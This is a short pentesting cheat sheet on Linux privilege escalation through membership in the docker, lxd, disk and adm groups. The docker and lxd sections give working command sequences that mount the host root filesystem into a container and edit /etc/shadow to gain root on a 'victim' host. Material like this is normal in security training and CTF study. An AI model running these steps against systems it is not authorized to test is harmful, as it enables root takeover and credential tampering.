# Group Based

## Docker

If we are member of docker group we can escalate our privilege to root.

The idea is, we are going to take `/` directory of host machine and mount it to our container. Once the directory is mounted, we will have root inside of our container and we can manipulate any files on this host file system through the container.

*   `docker run -v /:/mnt -it alpine`

    mount `/` from hot machine to `/mnt` with `-it` interactive terminal. using `alpine` image

When victim doesnot have internet, it cannot pull the alpine image, so

* `docker pull alpine` → pull alpine in attacker machine
* `docker save -o alpine.tar alpine` → save alpine image to tar file and transfer to victim
* `docker load -i /path/to/destination/alpine.tar` → load image from tar file

then we are done

* `docker image ls` → shows the images.

Watch this excellent video by Conda[https://youtu.be/pRBj2dm4CDU?list=PLDrNMcTNhhYrBNZ\_FdtMq-gLFQeUZFzWV](https://youtu.be/pRBj2dm4CDU?list=PLDrNMcTNhhYrBNZ\_FdtMq-gLFQeUZFzWV)



## LXC / LXD

Idea is the same as docker.

*   First we will download `Alpine Image` in our machine and transfer it to victim

    A minimal Docker _**image**_ based on _**Alpine**_ Linux with a complete package index and only 5 MB in size!
* `lxd init` to initialize linux container daemon

unzip the `Alpine.zip`

* `lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine`→ import local image.
* `lxc image list` → to list out the images
* `lxc init alpine dollarboysushil -c security.privileged=true` → Start a privileged container with the `security.privileged` set to `true` to run the container without a UID mapping, making the root user in the container the same as the root user on the host. here `alpine` is the name of the image and `dollarboysushil` is the name of the container we are going to spawn
*   `lxc config device add dollarboysushil mydev disk source=/ path=/mnt/root recursive=true` → Mount the host file system.

    we are mounting entire file system `/` of the host to path `/mnt/root`

    `recursive=true` to get all the files and folders.
* `lxc start dollarboysushil`→ starting the container. we can use `lxc list` to view the status
* `lxc exec dollarboysushil /bin/sh` → execute a command inside of our container

Now we are root on the container and container contains the whole file system of host. we can edit the `/mnt/etc/shadow`to remove / change password of root, so that we can login as root in host.



Watch this excellent video by Conda\
[https://youtu.be/7x4gwV632o0?list=PLDrNMcTNhhYrBNZ\_FdtMq-gLFQeUZFzWV](https://youtu.be/7x4gwV632o0?list=PLDrNMcTNhhYrBNZ\_FdtMq-gLFQeUZFzWV)

## DISK

User of disk group has full access within `/dev` such as `/dev/sda`

## ADM

Members of the adm group are able to read all logs stored in `/var/log`.



